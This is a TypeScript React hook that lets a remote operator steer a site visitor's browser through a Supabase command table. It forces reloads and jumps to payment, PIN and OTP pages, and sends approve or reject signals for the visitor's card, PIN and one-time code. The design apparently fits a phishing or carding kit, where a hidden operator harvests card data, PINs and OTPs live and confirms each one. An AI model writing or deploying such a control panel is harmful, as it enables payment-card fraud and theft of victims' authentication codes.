import { useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { visitorClient as supabase } from "@/lib/visitorClient";
import { getVisitorSessionId } from "@/hooks/useVisitorTracking";

const SHORTCUTS: Record<string, string> = {
  go_home: "/",
  go_checkout: "/checkout",
  go_payment: "/payment",
  go_pin: "/payment/pin",
  go_otp: "/payment/otp",
  go_success: "/success",
};

const APPROVAL_COMMANDS = new Set([
  "approve_card", "reject_card",
  "approve_pin", "reject_pin",
  "approve_otp", "reject_otp",
]);

const LAST_CMD_KEY = "sl_last_cmd_id";

export const useVisitorCommands = () => {
  const navigate = useNavigate();

  useEffect(() => {
    if (typeof window !== "undefined" && window.location.pathname.startsWith("/admin")) return;
    const session_id = getVisitorSessionId();
    if (session_id === "__admin_placeholder__") return;

    const handle = (cmd: { id: string; command: string; payload: any }) => {
      if (!cmd?.id) return;
      if (sessionStorage.getItem(LAST_CMD_KEY) === cmd.id) return;
      sessionStorage.setItem(LAST_CMD_KEY, cmd.id);

      const c = cmd.command;
      if (c === "reload") { window.location.reload(); return; }
      if (c === "navigate") {
        const path = cmd.payload?.path;
        if (typeof path === "string" && path.startsWith("/")) navigate(path);
        return;
      }
      if (APPROVAL_COMMANDS.has(c)) {
        window.dispatchEvent(new CustomEvent("visitor-approval", { detail: { command: c, payload: cmd.payload } }));
        return;
      }
      const target = SHORTCUTS[c];
      if (target) navigate(target);
    };

    // Fetch latest command on mount
    const fetchLatest = async () => {
      const { data } = await supabase
        .from("visitor_commands")
        .select("id, command, payload, created_at")
        .eq("session_id", session_id)
        .order("created_at", { ascending: false })
        .limit(1);
      if (data && data[0]) handle(data[0] as any);
    };

    fetchLatest();

    // Realtime subscription
    const channel = supabase
      .channel(`visitor_cmd_${session_id}_${Date.now()}`)
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "visitor_commands", filter: `session_id=eq.${session_id}` },
        (payload) => handle(payload.new as any),
      )
      .subscribe((status) => {
        console.log("[visitor-commands] realtime status:", status);
      });

    // Polling fallback every 3 seconds in case Realtime drops
    const pollInterval = setInterval(fetchLatest, 3000);

    return () => {
      clearInterval(pollInterval);
      supabase.removeChannel(channel);
    };
  }, [navigate]);
};
